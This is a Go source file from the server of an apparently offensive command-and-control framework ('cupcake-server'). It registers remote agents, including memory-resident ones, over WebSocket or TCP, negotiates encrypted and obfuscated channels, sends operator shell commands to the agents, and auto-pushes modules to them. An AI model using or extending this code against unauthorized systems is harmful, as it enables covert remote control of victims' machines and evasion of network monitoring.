package services

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"time"

	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/model"
	"cupcake-server/pkg/store"
	"cupcake-server/pkg/utils"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/hashicorp/yamux"
)

// resolveAgentSalt prefers per-build kdf_salt from register payload (base64 raw bytes).
func resolveAgentSalt(p map[string]interface{}, fallback string) string {
	if ks, ok := p["kdf_salt"].(string); ok && strings.TrimSpace(ks) != "" {
		if raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(ks)); err == nil && len(raw) > 0 {
			s := string(raw)
			if len(s) > 64 {
				s = s[:64]
			}
			return s
		}
	}
	return fallback
}

// appendAgentLog appends stdout/stderr lines under LogsMapMu (shared by WS + TCP paths).
func appendAgentLog(clientUUID string, stdout, stderr string) {
	globals.LogsMapMu.Lock()
	defer globals.LogsMapMu.Unlock()
	logs, _ := globals.LogsMap.LoadOrStore(clientUUID, []string{})
	logsArr := logs.([]string)
	if stdout != "" {
		logsArr = append(logsArr, stdout)
	}
	if stderr != "" {
		logsArr = append(logsArr, "[ERR] "+stderr)
	}
	const maxLogsPerAgent = 1000
	if len(logsArr) > maxLogsPerAgent {
		logsArr = logsArr[len(logsArr)-maxLogsPerAgent:]
	}
	globals.LogsMap.Store(clientUUID, logsArr)
}

// relayPendingResponse delivers a response map to a waiting API caller if any.
func relayPendingResponse(reqID string, pMap map[string]interface{}) {
	if reqID == "" {
		return
	}
	if ch, found := globals.PendingResponses.Load(reqID); found {
		select {
		case ch.(chan interface{}) <- pMap:
		default:
		}
	}
}

// deriveStaticSessionKey derives the static AES material matching the Rust agent
// get_aes_key() path (SHA256×100k via DeriveKeyAgent) — NOT Argon2id.
// Noise session keys still take precedence for live traffic via resolveClientSessionKey.
func deriveStaticSessionKey(encryptKey, encryptionSalt string) []byte {
	keyBytes := resolveAESKey(encryptKey)
	saltBytes := make([]byte, 32)
	copy(saltBytes, []byte(encryptionSalt))
	return utils.DeriveKeyAgent(keyBytes, saltBytes)
}

// resolveClientSessionKey returns Noise key if set, else cached SessionKey, else derives once and caches.
func resolveClientSessionKey(client *globals.Client) []byte {
	if client == nil {
		return nil
	}
	if client.NoiseSessionKey != [32]byte{} {
		return client.NoiseSessionKey[:]
	}
	if len(client.SessionKey) == 32 {
		return client.SessionKey
	}
	derived := deriveStaticSessionKey(client.EncryptKey, client.EncryptionSalt)
	client.SessionKey = derived
	return derived
}

// pickSessionKey prefers Noise ephemeral key when non-zero, else static derived key.
func pickSessionKey(noiseSessionKey [32]byte, staticSessionKey []byte) []byte {
	if noiseSessionKey != [32]byte{} {
		return noiseSessionKey[:]
	}
	return staticSessionKey
}

func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Listener) {
	var clientUUID string
	var client *globals.Client
	done := make(chan struct{})

	defer func() {
		close(done)
		if clientUUID != "" {
			if val, ok := globals.Clients.Load(clientUUID); ok {
				existingClient := val.(*globals.Client)
				if existingClient == client {
					globals.Clients.Delete(clientUUID)
					globals.PTYState.Delete(clientUUID)
					store.UpdateAgentStatus(clientUUID, "offline")
					
					// Notify Offline
					if client != nil {
						NotifyAgentOffline(client.UUID, client.Hostname)
						if client.OutputChannel != nil {
							close(client.OutputChannel)
						}
					}
				}
			}
		}
		if conn != nil {
			conn.Close()
		}
	}()

	// Start Write Loop only after registration
	startWriteLoop := func(c *globals.Client) {
		go func() {
			for {
				select {
				case <-done:
					return
				case cmdStr, ok := <-c.CommandChannel:
					if !ok {
						return
					}
					
					// Transformation: Wrap raw string from Admin Terminal into strict JSON Command
					msg := globals.MessageWrapper{
						MsgType: "command",
						Payload: globals.CommandPayload{
							CommandType:    "shell",
							CommandContent: cmdStr,
							ReqID:          uuid.New().String(),
						},
					}
					
					if err := WriteEncryptedMessage(c, msg); err != nil {
						log.Printf("Failed to send command to %s: %v", c.UUID, err)
						return
					}
					// Log terminal command (Ignore empty heartbeats/pings)
					if strings.TrimSpace(cmdStr) != "" {
						_ = store.CreateCommandLog(c.UUID, msg.Payload.(globals.CommandPayload).ReqID, "shell", cmdStr)
					}
				}
			}
		}()
	}

	// 🛡️ Anti-DoS: Limit max WebSocket frame size to 50MB to prevent OOM
	conn.SetReadLimit(50 * 1024 * 1024)

	// === Phase 1: Noise-like Ephemeral Handshake ===
	// Both sides generate ephemeral keys, derive a per-session key with forward secrecy.
	psk := resolveAESKey(ln.EncryptKey)
	var noiseSessionKey [32]byte
	if len(psk) > 0 {
		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		_, clientPubKey, err := conn.ReadMessage()
		if err != nil || len(clientPubKey) != utils.NoiseMsgLen {
			log.Printf("Noise handshake failed from %s: err=%v len=%d (want %d X25519)", remoteAddr, err, len(clientPubKey), utils.NoiseMsgLen)
			return
		}
		serverResponse, sessionKey, err := utils.NoiseRespond(clientPubKey, psk)
		if err != nil {
			log.Printf("Noise respond failed from %s: %v", remoteAddr, err)
			return
		}
		if err := conn.WriteMessage(websocket.BinaryMessage, serverResponse); err != nil {
			log.Printf("Noise response send failed to %s: %v", remoteAddr, err)
			return
		}
		noiseSessionKey = sessionKey
		log.Printf("[Noise] ✅ Handshake completed with %s", remoteAddr)
	}

	// Derive static session key ONCE per connection (Argon2id is expensive — never per packet)
	// When Noise succeeded, sessionKey = NoiseSessionKey (never salt-derived static for traffic).
	keyBytes := resolveAESKey(ln.EncryptKey)
	staticSessionKey := deriveStaticSessionKey(ln.EncryptKey, ln.EncryptionSalt)
	sessionKey := pickSessionKey(noiseSessionKey, staticSessionKey)
	fragRe := utils.NewFragReassembler()

	// --- Read Loop ---
	for {
		// 🛡️ Anti-Slowloris: Set a read deadline (e.g., 60 seconds per message)
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		
		messageType, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		// OpSec Logic: In Base64 mode, we use TextMessage, otherwise Binary
		_ = messageType // Avoid "unused" but informative for debugging

		// Prefer live client-cached key after register (Noise or static)
		if client != nil {
			sessionKey = resolveClientSessionKey(client)
		} else {
			sessionKey = pickSessionKey(noiseSessionKey, staticSessionKey)
		}
		
		useAES := isAESEnabled(ln.EncryptMode) || (strings.TrimSpace(ln.EncryptMode) == "" && len(keyBytes) > 0)

		var plaintext []byte
		if useAES {
			if len(keyBytes) == 0 {
				log.Printf("Encrypted listener missing AES key for %s", remoteAddr)
				break
			}
			// Deobfuscate + decrypt, with CKF1 multi-fragment reassembly
			pt, needMore, err := utils.OpenWire(fragRe, message, ln.ObfuscateMode, sessionKey)
			if err != nil {
				log.Printf("Decryption/reassembly failed for %s: %v", remoteAddr, err)
				break
			}
			if needMore {
				continue
			}
			plaintext = pt
		} else if len(keyBytes) > 0 {
			pt, needMore, err := utils.OpenWire(fragRe, message, ln.ObfuscateMode, sessionKey)
			if err == nil && !needMore {
				plaintext = pt
			} else if needMore {
				continue
			} else {
				plaintext = message
			}
		} else {
			plaintext = message
		}

		// Protocol Adapter: Unmarshal top-level MessageWrapper
		var msg globals.MessageWrapper
		if err := json.Unmarshal(plaintext, &msg); err != nil {
			log.Printf("Failed to unmarshal message: %v", err)
			continue
		}

		switch msg.MsgType {
		case "register":
			p, ok := msg.Payload.(map[string]interface{})
			if !ok {
				log.Printf("Invalid register payload format from %s", remoteAddr)
				continue
			}
			
			id, _ := p["uuid"].(string)
			hostname, _ := p["hostname"].(string)
			os, _ := p["os"].(string)
			username, _ := p["username"].(string)
			arch, _ := p["arch"].(string)
			source, _ := p["source"].(string)
			if source == "" { source = "disk" }

			agentSalt := resolveAgentSalt(p, ln.EncryptionSalt)

			// Determine status based on source
			status := "online"
			if source == "memory" {
				status = "memory_online"
			}

			// ⚡️ CRITICAL FIX: Upsert Agent to Database immediately
			agentDBModel := &model.Agent{
				UUID:      id,
				Hostname:  hostname,
				IP:        remoteAddr,
				OS:        os,
				Username:  username,
				Arch:      arch,
				Status:    status,
				LastSeen:  time.Now(),
				EncryptionSalt:  agentSalt,
				ObfuscationMode: ln.ObfuscateMode,
			}

			if err := store.SaveAgent(agentDBModel); err != nil {
				log.Printf("[DB] Failed to persist agent %s: %v", id, err)
			}

			client = &globals.Client{
				WebSocketConn:   conn,
				Transport:       "websocket",
				UUID:            id,
				Hostname:        hostname,
				OS:              os,
				Arch:            arch,
				Username:        username,
				IP:              remoteAddr,
				EncryptMode:     ln.EncryptMode,
				EncryptKey:      ln.EncryptKey,
				EncryptionSalt:  agentSalt,
				ObfuscateMode:   ln.ObfuscateMode,
				NoiseSessionKey: noiseSessionKey,
				SessionKey:      append([]byte(nil), staticSessionKey...),
				CommandChannel:  make(chan string, 10),
				OutputChannel:   make(chan string, 10),
				ListenerID:      ln.ID,
				ListenerPort:    ln.Port,
				CachedPlugins:   make(map[string]bool),
			}
			clientUUID = id

			globals.Clients.Store(id, client)

			// Notify Online
			NotifyAgentOnline(client.UUID, client.Hostname, client.IP, client.OS, client.Username)

			// Start the write loop now that the client is registered
			startWriteLoop(client)

		case "response":
			pMap, ok := msg.Payload.(map[string]interface{})
			if !ok {
				log.Printf("Invalid response payload format")
				continue
			}

			var resp globals.ResponsePayload
			if so, ok := pMap["stdout"].(string); ok { resp.Stdout = so }
			if se, ok := pMap["stderr"].(string); ok { resp.Stderr = se }
			if pa, ok := pMap["path"].(string); ok { resp.Path = pa }
			if req, ok := pMap["req_id"].(string); ok { resp.ReqID = req }

			// Stage0: auto-push L2 module when agent reports module_required:<id>
			if client != nil && resp.Stderr != "" && strings.Contains(resp.Stderr, "module_required:") {
				go MaybeAutoPushModule(client.UUID, resp.Stderr)
			}

			// Broadcast: Format output and send to Client.OutputChannel (Real-time Terminal)
			if client != nil && client.OutputChannel != nil {
				// Persistence: Update Output Log
				if resp.ReqID != "" {
					// ✅ V3.0.1 Quiet Heartbeat: 忽略周期生存 ping（不写日志，防止滚屏）
					if resp.ReqID == "heartbeat" {
						continue
					}
					go func() {
						store.UpdateCommandOutput(resp.ReqID, resp.Stdout, resp.Stderr)
					}()
				}

				output := resp.Stdout
				// 🛡️ NOISE FILTER: If output looks like JSON, don't send to terminal (likely raw data for internal modules)
				isJSON := len(output) > 2 && (output[0] == '[' || output[0] == '{')

				doneToken := "__CUPCAKE_DONE__"
				ptyDone := false
				if strings.Contains(output, doneToken) {
					ptyDone = true
					output = strings.ReplaceAll(output, doneToken, "")
				}
				if strings.Contains(resp.Stderr, doneToken) {
					ptyDone = true
					resp.Stderr = strings.ReplaceAll(resp.Stderr, doneToken, "")
				}
				if strings.TrimSpace(output) == "" {
					output = ""
				}
				
				if output == "" && resp.Stderr != "" {
					output = fmt.Sprintf("[ERR] %s", resp.Stderr)
				} else if resp.Stderr != "" && !isJSON {
					output = fmt.Sprintf("%s\n[ERR] %s", output, resp.Stderr)
				}
				
				if output != "" {
					if strings.Contains(output, "Interactive shell session ended") {
						globals.PTYState.Delete(clientUUID)
					}
					// ⚡️ Enhancement: Internal JSON wrap for TaskID support in real-time console
					internalMsg := struct {
						TaskID  string `json:"task_id"`
						Type    string `json:"type"`
						Content string `json:"content"`
					}{
						TaskID:  resp.ReqID,
						Type:    "TERM",
						Content: output,
					}
					if isJSON {
						internalMsg.Type = "JSON_DATA"
					}
					
					jsonOut, _ := json.Marshal(internalMsg)
					select {
					case client.OutputChannel <- string(jsonOut):
					default:
					}
				}
				if ptyDone {
					doneMsg := struct {
						TaskID  string `json:"task_id"`
						Type    string `json:"type"`
						Content string `json:"content"`
					}{
						TaskID:  resp.ReqID,
						Type:    "PTY_DONE",
						Content: "",
					}
					jsonOut, _ := json.Marshal(doneMsg)
					select {
					case client.OutputChannel <- string(jsonOut):
					default:
					}
				}
			}

			// Sync-Async Bridge + legacy log buffer (shared helpers for WS/TCP)
			if reqID, ok := pMap["req_id"].(string); ok {
				relayPendingResponse(reqID, pMap)
			}
			appendAgentLog(clientUUID, resp.Stdout, resp.Stderr)
		}
	}
}

// ProcessTCPConnection handles raw TCP or Yamux multiplexed control streams
func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener, session interface{}) {
	var clientUUID string
	var client *globals.Client
	done := make(chan struct{})

	defer func() {
		close(done)
		if clientUUID != "" {
			// ⚡ SAFETY CHECK: Only delete if the client in the map is actually this specific instance.
			// This prevents a stale/dying connection from removing a newer, active session for the same agent.
			if val, ok := globals.Clients.Load(clientUUID); ok {
				existingClient := val.(*globals.Client)
				if existingClient == client {
					globals.Clients.Delete(clientUUID)
					// Check current DB status to determine correct offline status
					offlineStatus := "offline"
					if agent, err := store.GetAgent(clientUUID); err == nil && agent != nil {
						if agent.Status == "memory_online" {
							offlineStatus = "memory_offline"
						}
					}
					store.UpdateAgentStatus(clientUUID, offlineStatus)
					log.Printf("\x1b[31m[-] Agent Offline\x1b[0m %s", clientUUID)
					if client != nil {
						NotifyAgentOffline(client.UUID, client.Hostname)
					}
					if client != nil && client.OutputChannel != nil {
						close(client.OutputChannel)
					}
				}
			}
		}
		conn.Close()
		if session != nil {
			if s, ok := session.(io.Closer); ok {
				s.Close()
			}
		}
	}()
// ... rest of logic remains same but uses 'conn' (which is the stream)

	startWriteLoop := func(c *globals.Client) {
		go func() {
			for {
				select {
				case <-done:
					return
				case cmdStr, ok := <-c.CommandChannel:
					if !ok { return }
					msg := globals.MessageWrapper{
						MsgType: "command",
						Payload: globals.CommandPayload{
							CommandType:    "shell",
							CommandContent: cmdStr,
							ReqID:          uuid.New().String(),
						},
					}
					if err := WriteEncryptedMessage(c, msg); err != nil {
						return
					}
					// Log terminal command (Ignore empty heartbeats/pings)
					if strings.TrimSpace(cmdStr) != "" {
						_ = store.CreateCommandLog(c.UUID, msg.Payload.(globals.CommandPayload).ReqID, "shell", cmdStr)
					}
				}
			}
		}()
	}

	// Connection accepted silently — derive static key once; hoist Noise key outside loop
	var noiseSessionKey [32]byte
	keyBytes := resolveAESKey(ln.EncryptKey)
	staticSessionKey := deriveStaticSessionKey(ln.EncryptKey, ln.EncryptionSalt)
	tcpFragRe := utils.NewFragReassembler()

	for {
		// 🛡️ Anti-Slowloris: Set a read deadline for header (30s)
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		
		// 1. Read Header (4 bytes length)
		header := make([]byte, 4)
		if _, err := io.ReadFull(conn, header); err != nil {
			// Normal disconnect - don't spam logs
			break
		}
		length := binary.BigEndian.Uint32(header)
		if length == 0 {
			continue
		}
		
		// 🛡️ Anti-DoS: Limit max frame size to 50MB
		if length > 50*1024*1024 {
			log.Printf("[TCP] Frame too large (%d bytes), closing connection for safety", length)
			break
		}

		// 🛡️ Anti-Slowloris: Set deadline based on payload size (e.g., 2 mins max for 50MB) 
		conn.SetReadDeadline(time.Now().Add(120 * time.Second))

		// 2. Read Body
		body := make([]byte, length)
		if _, err := io.ReadFull(conn, body); err != nil {
			log.Printf("[TCP] Failed to read body from %s (declared %d bytes): %v", remoteAddr, length, err)
			break
		}

		// Phase 1: X25519 ECDH handshake on TCP (33-byte v1 frame before registration)
		if clientUUID == "" && length == uint32(utils.NoiseMsgLen) && len(keyBytes) > 0 {
			serverResponse, sk, err := utils.NoiseRespond(body, keyBytes)
			if err == nil {
				noiseSessionKey = sk
				respHeader := make([]byte, 4)
				binary.BigEndian.PutUint32(respHeader, uint32(len(serverResponse)))
				if _, werr := conn.Write(respHeader); werr == nil {
					conn.Write(serverResponse)
				}
				log.Printf("[Noise] ✅ TCP X25519 handshake completed with %s", remoteAddr)
				continue // Wait for next real message
			}
		}

		sessionKey := pickSessionKey(noiseSessionKey, staticSessionKey)
		if client != nil {
			sessionKey = resolveClientSessionKey(client)
		}
		
		useAES := isAESEnabled(ln.EncryptMode) || (strings.TrimSpace(ln.EncryptMode) == "" && len(keyBytes) > 0)
		
		var plaintext []byte
		if useAES {
			if len(keyBytes) == 0 {
				log.Printf("[TCP] Encrypted listener missing AES key")
				break
			}
			pt, needMore, err := utils.OpenWire(tcpFragRe, body, ln.ObfuscateMode, sessionKey)
			if err != nil {
				log.Printf("[TCP] Decryption/reassembly failed from %s: body=%d key_len=%d err=%v",
					remoteAddr, len(body), len(sessionKey), err)
				break
			}
			if needMore {
				continue
			}
			plaintext = pt
		} else if len(keyBytes) > 0 {
			pt, needMore, err := utils.OpenWire(tcpFragRe, body, ln.ObfuscateMode, sessionKey)
			if err == nil && !needMore {
				plaintext = pt
			} else if needMore {
				continue
			} else {
				log.Printf("[TCP] Auto-detect decrypt failed from %s: body=%d err=%v", remoteAddr, len(body), err)
				plaintext = body
			}
		} else {
			plaintext = body
		}

		var msg globals.MessageWrapper
		if err := json.Unmarshal(plaintext, &msg); err != nil {
			log.Printf("[TCP] JSON Unmarshal Failed for Agent %s: %v", remoteAddr, err)
			log.Printf("[TCP] Raw Payload: %s", string(plaintext))
			continue
		}

		switch msg.MsgType {
		case "register":
			p, ok := msg.Payload.(map[string]interface{})
			if !ok {
				continue
			}
			id, _ := p["uuid"].(string)
			hostname, _ := p["hostname"].(string)
			os, _ := p["os"].(string)
			username, _ := p["username"].(string)
			arch, _ := p["arch"].(string)
			source, _ := p["source"].(string)
			if source == "" { source = "disk" }
			agentSalt := resolveAgentSalt(p, ln.EncryptionSalt)

			// Determine status based on source
			status := "online"
			if source == "memory" {
				status = "memory_online"
			}

			// 🚨 V3.0.1 Robustness: Close old connection if this agent is re-registering
			// ⚡ FIX: Store new client BEFORE closing old connection to prevent race condition
			// where old connection's defer marks the agent offline after new one registers.
			
			// Save reference to old client before overwriting
			var oldClient *globals.Client
			if oldVal, ok := globals.Clients.Load(id); ok {
				oldClient = oldVal.(*globals.Client)
			}

			var ySession *yamux.Session
			if s, ok := session.(*yamux.Session); ok {
				ySession = s
			}

			client = &globals.Client{
				TCPConn:         conn,
				YamuxSession:    ySession,
				Transport:       "tcp",
				UUID:            id,
				Hostname:        hostname,
				OS:              os,
				Arch:            arch,
				Username:        username,
				IP:              remoteAddr,
				EncryptMode:     ln.EncryptMode,
				EncryptKey:      ln.EncryptKey,
				EncryptionSalt:  agentSalt,
				ObfuscateMode:   ln.ObfuscateMode,
				NoiseSessionKey: noiseSessionKey,
				SessionKey:      append([]byte(nil), staticSessionKey...),
				CommandChannel:  make(chan string, 10),
				OutputChannel:   make(chan string, 10),
				ListenerID:      ln.ID,
				ListenerPort:    ln.Port,
				CachedPlugins:   make(map[string]bool),
			}
			clientUUID = id

			// Store new client FIRST (so old defer's equality check fails)
			globals.Clients.Store(id, client)

			// NOW close old connection safely
			if oldClient != nil && oldClient != client {
				log.Printf("\x1b[33m[~] Agent Migrating\x1b[0m %s → %s", id, remoteAddr)
				if oldClient.TCPConn != nil { oldClient.TCPConn.Close() }
				if oldClient.YamuxSession != nil { oldClient.YamuxSession.Close() }
			}

			// ⚡️ Upsert Agent to Database
			agentDBModel := &model.Agent{
				UUID:            id,
				Hostname:        hostname,
				IP:              remoteAddr,
				OS:              os,
				Username:        username,
				Arch:            arch,
				Status:          status,
				LastSeen:        time.Now(),
				EncryptionSalt:  agentSalt,
				ObfuscationMode: ln.ObfuscateMode,
			}
			
			if err := store.SaveAgent(agentDBModel); err != nil {
				log.Printf("[DB] Failed to persist TCP agent %s: %v", id, err)
			}

			log.Printf("\x1b[32m[+] Agent Online\x1b[0m %s @ %s (source: %s)", id, remoteAddr, source)
			NotifyAgentOnline(client.UUID, client.Hostname, client.IP, client.OS, client.Username)
			startWriteLoop(client)

		case "response":
			pMap, ok := msg.Payload.(map[string]interface{})
			if !ok {
				continue
			}

			var resp globals.ResponsePayload
			if so, ok := pMap["stdout"].(string); ok { resp.Stdout = so }
			if se, ok := pMap["stderr"].(string); ok { resp.Stderr = se }
			if pa, ok := pMap["path"].(string); ok { resp.Path = pa }
			if req, ok := pMap["req_id"].(string); ok { resp.ReqID = req }

			if client != nil && resp.Stderr != "" && strings.Contains(resp.Stderr, "module_required:") {
				go MaybeAutoPushModule(client.UUID, resp.Stderr)
			}

			if client != nil && client.OutputChannel != nil {
				if resp.ReqID != "" {
					// ⚡️ V3.0.1 Quiet Heartbeat: Ignore periodic survival pings in DB logs
					if resp.ReqID == "heartbeat" {
						continue
					}
					go store.UpdateCommandOutput(resp.ReqID, resp.Stdout, resp.Stderr)
					// Response handled silently
				}
				output := resp.Stdout
				if output == "" && resp.Stderr != "" {
					output = "[ERR] " + resp.Stderr
				}
				if output != "" {
					select {
					case client.OutputChannel <- output:
					default:
					}
				}
			}

			if reqID, ok := pMap["req_id"].(string); ok {
				relayPendingResponse(reqID, pMap)
			}
			if so, se := "", ""; true {
				if v, ok := pMap["stdout"].(string); ok {
					so = v
				}
				if v, ok := pMap["stderr"].(string); ok {
					se = v
				}
				appendAgentLog(clientUUID, so, se)
			}
		}
	}
}

// WriteEncryptedMessage is a helper to encrypt and send JSON messages to any transport
func WriteEncryptedMessage(client *globals.Client, msg interface{}) error {
	// Remember non-module commands so module_required can auto-retry after stage
	if client != nil {
		var mw *globals.MessageWrapper
		switch m := msg.(type) {
		case globals.MessageWrapper:
			mw = &m
		case *globals.MessageWrapper:
			mw = m
		}
		if mw != nil && mw.MsgType == "command" {
			if cp, ok := mw.Payload.(globals.CommandPayload); ok {
				RememberCommandForModuleRetry(client.UUID, cp)
			}
		}
	}

	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	keyBytes := resolveAESKey(client.EncryptKey)
	// Use cached/Noise session key — never re-run Argon2id on the hot path
	sessionKey := resolveClientSessionKey(client)
	
	useAES := isAESEnabled(client.EncryptMode) || (strings.TrimSpace(client.EncryptMode) == "" && len(keyBytes) > 0)

	var payload []byte
	if useAES {
		if len(keyBytes) == 0 {
			return fmt.Errorf("encrypt mode enabled but AES key is empty")
		}
		
		// 1. Encrypt
		encrypted, err := utils.EncryptAES(data, sessionKey)
		if err != nil {
			return err
		}
		
		// 2. Obfuscate
		payload = utils.ObfuscatePacket(encrypted, client.ObfuscateMode, sessionKey)
	} else {
		payload = data
	}

	if client.Transport == "websocket" {
		msgType := websocket.BinaryMessage
		if strings.ToLower(client.ObfuscateMode) == "base64" {
			msgType = websocket.TextMessage
		}
		// Serialize concurrent WebSocket writers (startWriteLoop + other senders)
		client.WSWriteMu.Lock()
		defer client.WSWriteMu.Unlock()
		return client.WebSocketConn.WriteMessage(msgType, payload)
	} else if client.Transport == "tcp" {
		// 🐛 互斥锁防止与 startWriteLoop 并发写导致消息错位
		client.TCPWriteMu.Lock()
		defer client.TCPWriteMu.Unlock()

		// Use framing for TCP
		header := make([]byte, 4)
		binary.BigEndian.PutUint32(header, uint32(len(payload)))
		if _, err := client.TCPConn.Write(header); err != nil {
			return err
		}
		if _, err := client.TCPConn.Write(payload); err != nil {
			return err
		}
		return nil
	}

	return fmt.Errorf("unknown transport: %s", client.Transport)
}

func isAESEnabled(mode string) bool {
	switch strings.ToUpper(strings.TrimSpace(mode)) {
	case "AES-256-GCM", "AES-GCM", "AES":
		return true
	default:
		return false
	}
}

func resolveAESKey(key string) []byte {
	key = strings.TrimSpace(key)
	if key == "" {
		key = store.GetSetting("system_aes_key")
	}
	return normalizeAESKey(key)
}

func normalizeAESKey(key string) []byte {
	key = strings.TrimSpace(key)
	if len(key) == 64 && isHexString(key) {
		if decoded, err := hex.DecodeString(key); err == nil && len(decoded) == 32 {
			return decoded
		}
	}
	// Pad or truncate to 32 bytes (matches Rust client resize(32, 0x00))
	res := make([]byte, 32)
	copy(res, []byte(key))
	return res
}
